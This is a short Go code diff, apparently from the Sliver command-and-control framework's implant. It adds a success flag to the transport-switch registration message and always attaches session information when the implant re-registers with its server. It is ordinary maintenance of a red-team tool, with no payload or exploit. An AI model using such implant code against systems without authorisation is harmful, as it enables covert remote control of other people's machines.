@@ -254,7 +254,7 @@ func (t *C2) Register(isSwitch bool, oldTransportID string) (err error) {
 	if t.Profile.Type == sliverpb.C2Type_Session {
 		// Either switch
 		if isSwitch {
-			t.Connection.RequestSend(t.registerSwitch(oldTransportID))
+			t.Connection.RequestSend(t.registerSwitch(oldTransportID, true))
 			return
 		}
 		// Or new
@@ -272,7 +272,7 @@ func (t *C2) Register(isSwitch bool, oldTransportID string) (err error) {
 	// Or register a beacon, wrapping the register into a special envelope.
 	if t.Profile.Type == sliverpb.C2Type_Beacon {
 		if isSwitch {
-			t.Connection.RequestSend(t.registerSwitch(oldTransportID))
+			t.Connection.RequestSend(t.registerSwitch(oldTransportID, true))
 		} else {
 			t.Connection.RequestSend(t.registerBeacon())
 		}
@@ -439,8 +439,9 @@ func (t *C2) registerBeacon() *sliverpb.Envelope {
 // registerSwitch - The transport is started following a request to switch
 // transports. The registering process is not as complete as the classic
 // one, and we just update connection/transport relevant values.
-func (t *C2) registerSwitch(oldTransportID string) *sliverpb.Envelope {
+func (t *C2) registerSwitch(oldTransportID string, success bool) *sliverpb.Envelope {
 
+	// Base transport switch information
 	register := &sliverpb.RegisterTransportSwitch{
 		OldTransportID: oldTransportID,
 		TransportID:    t.ID,
@@ -448,21 +449,33 @@ func (t *C2) registerSwitch(oldTransportID string) *sliverpb.Envelope {
 		Response:       &commonpb.Response{},
 	}
 
+	// Base session information is always sent in the session
+	// and this also includes transport statistics.
+	register.Session = t.registerSliver()
+
+	// Beacon transport information, if C2 is one
 	if t.Profile.Type == sliverpb.C2Type_Beacon {
 		nextBeacon := time.Now().Add(t.Duration())
 		register.Beacon = &sliverpb.BeaconRegister{
 			ID:          BeaconID,
-			Register:    t.registerSliver(),
 			Interval:    t.Profile.Interval,
 			Jitter:      t.Profile.Jitter,
 			NextCheckin: nextBeacon.UTC().Unix(),
 		}
-	} else {
-		register.Session = t.registerSliver()
 	}
 
-	data, err := proto.Marshal(register)
+	// Finally, notify success or not: this is used to confirm to the server
+	// we have a running physical connection/session (HTTP/DNS, etc) and a running
+	// Sliver TLV RPC layer on top of it. If not success, this transport is the current
+	// one and still running: it allows for it to update its own beaconing info, and more.
+	if success {
+		register.Success = true
+	} else {
+		register.Success = false
+	}
 
+	// Package the message
+	data, err := proto.Marshal(register)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("Failed to encode register msg %s", err)
